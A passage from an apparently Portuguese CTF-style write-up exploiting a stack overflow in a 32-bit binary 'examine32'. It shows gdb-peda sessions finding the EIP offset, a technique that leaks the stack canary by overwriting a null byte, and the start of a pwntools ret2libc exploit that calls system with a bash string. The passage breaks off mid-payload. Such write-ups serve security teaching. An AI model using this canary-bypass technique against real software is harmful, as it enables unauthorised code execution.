<span class="w">            </span>\<span class="p">[</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="o">-</span><span class="n">code</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="o">-</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x8048741</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">145</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">lea</span><span class="w"> </span><span class="n">esi</span><span class="p">,</span>\<span class="p">[</span><span class="n">esi</span><span class="o">+</span><span class="n">eiz</span>\<span class="o">*</span><span class="mi">1</span><span class="o">+</span><span class="mh">0x0</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x8048748</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">152</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">xor</span><span class="w"> </span><span class="n">eax</span><span class="p">,</span><span class="n">eax</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x804874a</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">154</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">mov</span><span class="w"> </span><span class="n">esi</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span>\<span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x3fc</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">            </span>\<span class="o">=&gt;</span><span class="w"> </span><span class="mh">0x8048751</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">161</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">xor</span><span class="w"> </span><span class="n">esi</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="n">gs</span><span class="p">:</span><span class="mh">0x14</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x8048758</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">168</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">jne</span><span class="w"> </span><span class="mh">0x8048762</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">178</span><span class="o">&gt;</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x804875a</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">170</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">lea</span><span class="w"> </span><span class="n">esp</span><span class="p">,</span>\<span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x804875d</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">173</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">ebx</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x804875e</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">174</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">esi</span><span class="w">  </span>
<span class="w">            </span>\<span class="p">[</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">——</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="n">stack</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="o">-</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">            </span>\<span class="p">[</span><span class="o">...</span><span class="w"> </span><span class="n">cortado</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">            </span><span class="n">Breakpoint</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mh">0x08048751</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">main</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="c1"># atingimos o breakpoint  </span>
<span class="w">            </span><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="o">$</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="c1"># indo para o jne  </span>
<span class="w">            </span>\<span class="p">[</span><span class="o">...</span><span class="w"> </span><span class="n">cortado</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">            </span>\<span class="p">[</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="o">-</span><span class="n">code</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">——</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="o">-</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x8048748</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">152</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">xor</span><span class="w"> </span><span class="n">eax</span><span class="p">,</span><span class="n">eax</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x804874a</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">154</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">mov</span><span class="w"> </span><span class="n">esi</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span>\<span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x3fc</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x8048751</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">161</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">xor</span><span class="w"> </span><span class="n">esi</span><span class="p">,</span><span class="n">DWORD</span><span class="w"> </span><span class="n">PTR</span><span class="w"> </span><span class="n">gs</span><span class="p">:</span><span class="mh">0x14</span><span class="w">  </span>
<span class="w">            </span>\<span class="o">=&gt;</span><span class="w"> </span><span class="mh">0x8048758</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">168</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">jne</span><span class="w"> </span><span class="mh">0x8048762</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">178</span><span class="o">&gt;</span><span class="w">  </span>
<span class="w">             </span><span class="o">|</span><span class="w"> </span><span class="mh">0x804875a</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">170</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">lea</span><span class="w"> </span><span class="n">esp</span><span class="p">,</span>\<span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">             </span><span class="o">|</span><span class="w"> </span><span class="mh">0x804875d</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">173</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">ebx</span><span class="w">  </span>
<span class="w">             </span><span class="o">|</span><span class="w"> </span><span class="mh">0x804875e</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">174</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">esi</span><span class="w">  </span>
<span class="w">             </span><span class="o">|</span><span class="w"> </span><span class="mh">0x804875f</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">175</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">edi</span><span class="w">  </span>
<span class="w">             </span><span class="o">|-&gt;</span><span class="w"> </span><span class="mh">0x8048762</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">178</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">call</span><span class="w"> </span><span class="mh">0x80485e0</span><span class="w"> </span><span class="o">&lt;</span>\<span class="n">_</span>\<span class="n">_stack</span>\<span class="n">_chk</span>\<span class="n">_fail</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x8048767</span><span class="w"> </span><span class="o">&lt;</span>\<span class="n">_start</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">xor</span><span class="w"> </span><span class="n">ebp</span><span class="p">,</span><span class="n">ebp</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x8048769</span><span class="w"> </span><span class="o">&lt;</span>\<span class="n">_start</span><span class="o">+</span><span class="mi">2</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">esi</span><span class="w">  </span>
<span class="w">             </span><span class="mh">0x804876a</span><span class="w"> </span><span class="o">&lt;</span>\<span class="n">_start</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">mov</span><span class="w"> </span><span class="n">ecx</span><span class="p">,</span><span class="n">esp</span><span class="w">  </span>
<span class="w">             </span><span class="n">JUMP</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">taken</span><span class="w">  </span>
<span class="w">            </span>\<span class="p">[</span><span class="o">...</span><span class="w"> </span><span class="n">cortado</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">            </span><span class="mh">0x08048758</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">main</span><span class="w"> </span><span class="p">()</span><span class="w">  </span>
<span class="w">            </span><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="o">$</span><span class="w"> </span><span class="n">j</span><span class="w"> </span>\<span class="o">*</span><span class="w"> </span><span class="n">main</span><span class="o">+</span><span class="mi">170</span><span class="w"> </span><span class="c1"># dando um jump para 0x804875a, ignorando o jne  </span>
<span class="w">            </span><span class="n">Continuing</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mh">0x804875a</span><span class="o">.</span>

<span class="w">            </span><span class="n">Program</span><span class="w"> </span><span class="n">received</span><span class="w"> </span><span class="k">signal</span><span class="w"> </span><span class="n">SIGSEGV</span><span class="p">,</span><span class="w"> </span><span class="n">Segmentation</span><span class="w"> </span><span class="n">fault</span><span class="o">.</span><span class="w">  </span>
<span class="w">            </span>\<span class="p">[</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">——</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="n">registers</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="o">-</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">            </span><span class="n">EAX</span><span class="p">:</span><span class="w"> </span><span class="mh">0x0</span><span class="w">  </span>
<span class="w">            </span><span class="n">EBX</span><span class="p">:</span><span class="w"> </span><span class="mh">0x6e41246e</span><span class="w"> </span><span class="p">(</span><span class="err">‘</span><span class="n">n</span><span class="o">$</span><span class="n">An</span><span class="err">’</span><span class="p">)</span><span class="w">  </span>
<span class="w">            </span><span class="n">ECX</span><span class="p">:</span><span class="w"> </span><span class="mh">0xf7f858a4</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="mh">0x0</span><span class="w">  </span>
<span class="w">            </span><span class="n">EDX</span><span class="p">:</span><span class="w"> </span><span class="mh">0xffffffff</span><span class="w">  </span>
<span class="w">            </span><span class="n">ESI</span><span class="p">:</span><span class="w"> </span><span class="mh">0x436e416e</span><span class="w"> </span><span class="p">(</span><span class="err">‘</span><span class="n">nAnC</span><span class="err">’</span><span class="p">)</span><span class="w">  </span>
<span class="w">            </span><span class="n">EDI</span><span class="p">:</span><span class="w"> </span><span class="mh">0x412d6e41</span><span class="w"> </span><span class="p">(</span><span class="err">‘</span><span class="n">An</span><span class="o">-</span><span class="n">A</span><span class="err">’</span><span class="p">)</span><span class="w">  </span>
<span class="w">            </span><span class="n">EBP</span><span class="p">:</span><span class="w"> </span><span class="mh">0x6e41286e</span><span class="w"> </span><span class="p">(</span><span class="err">‘</span><span class="n">n</span><span class="p">(</span><span class="n">An</span><span class="err">’</span><span class="p">)</span><span class="w">  </span>
<span class="w">            </span><span class="n">ESP</span><span class="p">:</span><span class="w"> </span><span class="mh">0xffffd650</span><span class="w"> </span><span class="p">(</span><span class="err">“</span><span class="n">An</span><span class="p">)</span><span class="n">AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAni</span>
<span class="w">            </span><span class="n">An8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZA</span>
<span class="w">            </span><span class="n">nxAnyAnzAC</span><span class="o">%</span><span class="n">ACsACBAC</span><span class="o">$</span><span class="n">ACnACCAC</span><span class="o">-</span><span class="n">AC</span><span class="p">(</span><span class="n">ACDAC</span><span class="err">”…</span><span class="p">)</span><span class="w">  </span>
<span class="w">            </span><span class="n">EIP</span><span class="p">:</span><span class="w"> </span><span class="mh">0x3b6e4144</span><span class="w"> </span><span class="p">(</span><span class="err">‘</span><span class="n">DAn</span><span class="p">;</span><span class="err">’</span><span class="p">)</span><span class="w"> </span><span class="c1"># EIP sobrescrito  </span>
<span class="w">            </span><span class="n">EFLAGS</span><span class="p">:</span><span class="w"> </span><span class="mh">0x10206</span><span class="w"> </span><span class="p">(</span><span class="n">carry</span><span class="w"> </span><span class="n">PARITY</span><span class="w"> </span><span class="n">adjust</span><span class="w"> </span><span class="n">zero</span><span class="w"> </span><span class="nb">sign</span><span class="w"> </span><span class="n">trap</span><span class="w"> </span><span class="n">INTERRUPT</span><span class="w"> </span><span class="n">direction</span><span class="w"> </span><span class="n">overflow</span><span class="p">)</span><span class="w">  </span>
<span class="w">            </span>\<span class="p">[</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="o">-</span><span class="n">code</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="err">—</span><span class="w"> </span><span class="o">-</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">            </span><span class="n">Invalid</span><span class="w"> </span><span class="o">$</span><span class="n">PC</span><span class="w"> </span><span class="n">address</span><span class="p">:</span><span class="w"> </span><span class="mh">0x3b6e4144</span><span class="w">  </span>
<span class="w">            </span>\<span class="p">[</span><span class="o">...</span><span class="w"> </span><span class="n">cortado</span>\<span class="p">]</span><span class="w">  </span>
<span class="w">            </span><span class="n">Stopped</span><span class="w"> </span><span class="n">reason</span><span class="p">:</span><span class="w"> </span><span class="n">SIGSEGV</span><span class="w">  </span>
<span class="w">            </span><span class="mh">0x3b6e4144</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="err">??</span><span class="w"> </span><span class="p">()</span><span class="w">  </span>
<span class="w">            </span><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="o">$</span><span class="w"> </span><span class="n">pattern</span>\<span class="n">_offset</span><span class="w"> </span><span class="err">“</span><span class="n">DAn</span><span class="p">;</span><span class="err">”</span><span class="w"> </span><span class="c1"># procurando o offset de “DAn;”   </span>
<span class="w">            </span><span class="n">DAn</span><span class="p">;</span><span class="w"> </span><span class="n">found</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">offset</span><span class="p">:</span><span class="w"> </span><span class="mi">1032</span><span class="w"> </span><span class="c1"># achamos o offset</span>
</code></pre></div>


<h4>Lendo o Canary</h4>
<p>Precisamos de alguma forma ler o conteúdo do Canary para coloca-lo certo na stack. <br />
Depois de receber um <em>input</em> o programa executa o código abaixo, que transforma a array para URL Encoding.</p>
<div class="codehilite"><pre><span></span><code><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="ss">(</span><span class="nv">i</span><span class="o">=</span><span class="mi">0</span><span class="c1">; i &lt; strlen(s); i++)  </span>
<span class="w">                 </span><span class="nv">printf</span><span class="ss">(</span><span class="s2">&quot;%%%2X&quot;</span>,<span class="w"> </span><span class="nv">s</span>\[<span class="nv">i</span>\]<span class="ss">)</span><span class="c1">;</span>
</code></pre></div>


<p><img alt="" src="img/1__ApAL8LqAtt__k__oIK8DiK__A.png" /></p>
<p>Essa é a <em>stack</em> normal do programa, com o Canary logo depois da <em>array</em> que estamos sobrescrevendo. Note os bytes nulos no final dos dois.</p>
<p>Uma <em>string</em>, sendo uma <em>array</em> de <em>chars</em>, tem seu término delimitado pelo byte nulo. Se sobrescrevermos apenas o <em>nullbyte</em> da string “<em>s”</em> o <em>strlen</em> continuará contando até encontrar o outro <em>nullbyte</em> do Canary, assim, conseguiremos <em>printar</em> o valor do Canary.<br />
Segue :</p>
<div class="codehilite"><pre><span></span><code>            $ python -c “print ‘A’\*1001” &gt; aaa # 1001 é o tamanho da array  
            $ ./examine32 &lt; aaa  
            \[... cortado\]  
            URL encoding: %41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%FFFFFF9C%FFFFFFCF%FFFFFFD3%FFFFFFC4%43%FFFFFFF8%FFFFFFF7
</code></pre></div>


<p>Conseguimos assim ler os valores do Canary, depois temos apenas que montar a stack com o valor dele para não cairmos no <em>__stack_chk_fail.</em></p>
<p>E o exploit final :</p>
<div class="codehilite"><pre><span></span><code>            <span class="s s-Atom">from</span> <span class="s s-Atom">pwn</span> <span class="s s-Atom">import</span> <span class="o">*</span>

            <span class="s s-Atom">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="s2">&quot;./examine32&quot;</span><span class="p">)</span>
            <span class="s s-Atom">offset</span> <span class="o">=</span> <span class="mi">1032</span> <span class="s s-Atom">#</span> <span class="s s-Atom">offset</span> <span class="s s-Atom">para</span> <span class="s s-Atom">sobrescrever</span> <span class="s s-Atom">o</span> <span class="nv">EIP</span>
            <span class="s s-Atom">read_canary_payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">1001</span> <span class="s s-Atom">#</span> <span class="s s-Atom">sobrescrevendo</span> <span class="s s-Atom">o</span> <span class="s s-Atom">nullbyte</span> <span class="s s-Atom">para</span> <span class="s s-Atom">leakar</span> <span class="s s-Atom">o</span> <span class="nb">val</span><span class="s s-Atom">or</span> <span class="s s-Atom">do</span> <span class="nv">Canary</span>
            <span class="s s-Atom">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="s s-Atom">read_canary_payload</span><span class="p">)</span>
            <span class="s s-Atom">canary</span> <span class="o">=</span> <span class="s s-Atom">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="s2">&quot;Timestamp&quot;</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="s2">&quot;%&quot;</span><span class="p">)</span> 
            <span class="s s-Atom">canary</span> <span class="o">=</span> <span class="p">[</span><span class="s s-Atom">canary</span><span class="p">[</span><span class="s s-Atom">i</span><span class="p">][</span><span class="o">-</span><span class="mi">2</span><span class="o">:</span><span class="p">]</span> <span class="s s-Atom">for</span> <span class="s s-Atom">i</span> <span class="s s-Atom">in</span> <span class="nf">range</span><span class="p">(</span><span class="o">-</span><span class="mi">7</span><span class="p">,</span><span class="mi">0</span><span class="p">)][</span><span class="o">:</span><span class="mi">3</span><span class="p">]</span> <span class="s s-Atom">#</span> <span class="nv">Lendo</span> <span class="s s-Atom">o</span> <span class="s s-Atom">output</span>
            <span class="s s-Atom">canary</span> <span class="o">=</span> <span class="p">[</span><span class="s s-Atom">x</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="s2">&quot;0&quot;</span><span class="p">)</span> <span class="s s-Atom">for</span> <span class="s s-Atom">x</span> <span class="s s-Atom">in</span> <span class="s s-Atom">canary</span><span class="p">]</span> <span class="s s-Atom">#</span> <span class="s s-Atom">o</span> <span class="s s-Atom">zero</span> <span class="s s-Atom">buga</span> <span class="s s-Atom">o</span> <span class="s s-Atom">printf</span>
            <span class="s s-Atom">print</span> <span class="s2">&quot;[!] Canary found : &quot;</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="s s-Atom">canary</span><span class="p">)</span>
            <span class="s s-Atom">canary</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="s s-Atom">&#39;&#39;</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="s s-Atom">canary</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>

            <span class="s s-Atom">system</span> <span class="o">=</span> <span class="mh">0xf7e19e70</span>
            <span class="s s-Atom">exit</span> <span class="o">=</span> <span class="mh">0xf7e0cf50</span>
            <span class="s s-Atom">bash</span> <span class="o">=</span> <span class="mh">0xf7f39fcc</span>

            <span class="s s-Atom">exploit</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">1000</span><span class="o">+</span><span class="nf">p32</span><span class="p">(</span><span class="s s-Atom">canary</span><span class="p">)[</span><span class="o">::-</span><span class="mi">1</span><span class="p">]</span><span class="s s-Atom">+</span><span class="err">&quot;</span><span class="s s-Atom">\x00</span><span class="s2">&quot; # o canary acaba com nullbyte</span>
